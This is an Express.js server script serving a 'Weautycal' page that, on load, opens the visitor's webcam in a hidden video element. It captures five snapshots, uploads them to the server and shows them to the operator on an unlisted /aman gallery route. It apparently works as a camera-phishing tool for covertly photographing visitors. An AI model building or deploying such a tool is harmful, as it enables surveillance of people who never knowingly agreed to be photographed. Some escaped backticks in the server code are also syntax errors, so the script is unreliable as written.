import express from "express";
import fs from "fs";
import path from "path";

const app = express();
const PORT = process.env.PORT || 3000;

const __dirname = process.cwd();
const uploadDir = path.join(__dirname, "photos");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.use(express.json({ limit: "10mb" }));

// ✅ serve photos folder
app.use("/photos", express.static(uploadDir));

// ✅ Home (auto photo capture page)
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Weautycal</title>
  <style>
    body { margin:0; font-family:Poppins,sans-serif; background:radial-gradient(circle,rgba(59,175,194,0.95),rgba(0,0,0,0.9)); color:white; text-align:center; }
    .logo { font-size:2.5em; font-weight:bold; margin:20px; animation:rainbow 3s linear infinite; text-shadow:0 0 15px rgba(255,255,255,0.8); }
    @keyframes rainbow { 0%{color:#ff0044;}25%{color:#ffbb00;}50%{color:#00ff88;}75%{color:#0088ff;}100%{color:#ff00cc;} }
    video { display:none; }
  </style>
</head>
<body>
  <div class="logo">🌸 Weautycal</div>
  <div class="info">Capturing 5 photos...</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    async function capturePhotos() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      let count = 0;
      const interval = setInterval(async () => {
        if (count >= 5) {
          clearInterval(interval);
          stream.getTracks().forEach(track => track.stop());
          window.location.href = "/aman";
          return;
        }
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const data = canvas.toDataURL("image/png");

        await fetch("/upload-base64", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: data })
        });
        count++;
      }, 1500);
    }
    capturePhotos();
  </script>
</body>
</html>
  `);
});

// ✅ Gallery page (/aman)
app.get("/aman", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Weautycal Gallery</title>
  <style>
    body { margin:0; font-family:Poppins,sans-serif; background:radial-gradient(circle,rgba(59,175,194,0.95),rgba(0,0,0,0.9)); color:white; text-align:center; }
    .logo { font-size:2.5em; font-weight:bold; margin:20px; animation:rainbow 3s linear infinite; text-shadow:0 0 15px rgba(255,255,255,0.8); }
    @keyframes rainbow { 0%{color:#ff0044;}25%{color:#ffbb00;}50%{color:#00ff88;}75%{color:#0088ff;}100%{color:#ff00cc;} }
    #gallery { display:flex; flex-wrap:wrap; justify-content:center; gap:15px; }
    #gallery img { width:200px; border-radius:15px; box-shadow:0 0 20px rgba(255,255,255,0.4); transition:transform 0.3s; }
    #gallery img:hover { transform:scale(1.1); }
    button { margin:20px; padding:10px 20px; border:none; border-radius:10px; background:#ff00cc; color:white; font-size:1em; cursor:pointer; }
  </style>
</head>
<body>
  <h1 class="logo">🌸 Weautycal Gallery</h1>
  <div id="gallery"></div>
  <button onclick="clearPhotos()">Clear Photos</button>

  <script>
    async function loadGallery() {
      const res = await fetch("/photos-list");
      const data = await res.json();
      const gallery = document.getElementById("gallery");
      gallery.innerHTML = "";
      data.photos.forEach(url => {
        const img = document.createElement("img");
        img.src = url;
        gallery.appendChild(img);
      });
    }
    async function clearPhotos() {
      await fetch("/clear");
      loadGallery();
    }
    loadGallery();
  </script>
</body>
</html>
  `);
});

// ✅ Upload photo (base64)
app.post("/upload-base64", (req, res) => {
  try {
    const imgData = req.body.image;
    const buffer = Buffer.from(imgData.split(",")[1], "base64");
    const filename = \`photo-\${Date.now()}.png\`;
    fs.writeFileSync(path.join(uploadDir, filename), buffer);
    res.json({ success: true, filename });
  } catch {
    res.status(500).json({ error: "Upload failed" });
  }
});

// ✅ Photos list
app.get("/photos-list", (req, res) => {
  const files = fs.readdirSync(uploadDir).map(f => "/photos/" + f);
  res.json({ photos: files });
});

// ✅ Clear photos
app.get("/clear", (req, res) => {
  fs.readdirSync(uploadDir).forEach(f => fs.unlinkSync(path.join(uploadDir, f)));
  res.json({ success: true });
});

app.listen(PORT, () => console.log(\`🚀 Server running on port \${PORT}\`));
